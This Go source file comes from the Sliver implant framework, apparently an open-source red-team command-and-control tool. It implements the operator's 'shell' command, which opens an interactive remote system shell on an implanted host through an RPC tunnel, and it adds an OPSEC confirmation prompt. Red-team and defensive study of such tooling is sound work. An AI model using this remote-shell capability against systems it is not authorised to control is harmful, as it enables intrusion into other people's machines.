package sliver

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"os"

	"golang.org/x/crypto/ssh/terminal"
	"gopkg.in/AlecAivazis/survey.v1"

	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	windows = "windows"
)

// Shell - Start an interactive system shell on the session host.
type Shell struct {
	Options struct {
		NoPty bool   `long:"no-pty" short:"y" description:"disable use of pty on macos/linux"`
		Path  string `long:"shell-path" short:"s" description:"path to shell interpreter"`
	} `group:"shell options"`
}

// Execute - Start an interactive system shell on the session host.
func (sh *Shell) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	if !isUserAnAdult() {
		return
	}

	shellPath := sh.Options.Path
	noPty := sh.Options.NoPty
	if session.OS == windows {
		noPty = true // Windows of course doesn't have PTYs
	}
	runInteractive(shellPath, noPty, transport.RPC)
	fmt.Println("Shell exited")

	return
}

func runInteractive(shellPath string, noPty bool, rpc rpcpb.SliverRPCClient) {
	fmt.Printf(util.Info + "Opening shell tunnel (EOF to exit) ...\n\n")
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	// Create an RPC tunnel, then start it before binding the shell to the newly created tunnel
	rpcTunnel, err := rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	if err != nil {
		fmt.Printf(util.Error+"%s\n", err)
		return
	}
	log.ClientLogger.Debugf("Created new tunnel with id: %d, binding to shell ...", rpcTunnel.TunnelID)

	// Start() takes an RPC tunnel and creates a local Reader/Writer tunnel object
	tunnel := transport.Tunnels.Start(rpcTunnel.TunnelID, rpcTunnel.SessionID)

	shell, err := rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Path:      shellPath,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
		Request:   cctx.Request(session),
	})
	if err != nil {
		fmt.Printf(util.Error+"%s\n", err)
		return
	}
	log.ClientLogger.Debugf("Bound remote shell pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	fmt.Printf(util.Info+"Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		log.ClientLogger.Debugf("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(util.Error + "Failed to save terminal state")
			return
		}
	}

	log.ClientLogger.Tracef("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.ClientLogger.Tracef("Wrote %d bytes to stdout", n)
		if err != nil {
			fmt.Printf(util.Error+"Error writing to stdout: %v", err)
			return
		}
	}()

	log.ClientLogger.Debugf("Reading from stdin ...")
	n, err := io.Copy(tunnel, os.Stdin)
	log.ClientLogger.Tracef("Read %d bytes from stdin", n)
	if err != nil && err != io.EOF {
		fmt.Printf(util.Error+"Error reading from stdin: %v", err)
	}

	if !noPty {
		log.ClientLogger.Debugf("Restoring terminal state ...")
		terminal.Restore(0, oldState)
	}

	log.ClientLogger.Debugf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()
}

// This should be called for any dangerous (OPSEC-wise) functions
func isUserAnAdult() bool {
	confirm := false
	prompt := &survey.Confirm{Message: "This action is bad OPSEC, are you an adult?"}
	survey.AskOne(prompt, &confirm, nil)
	return confirm
}
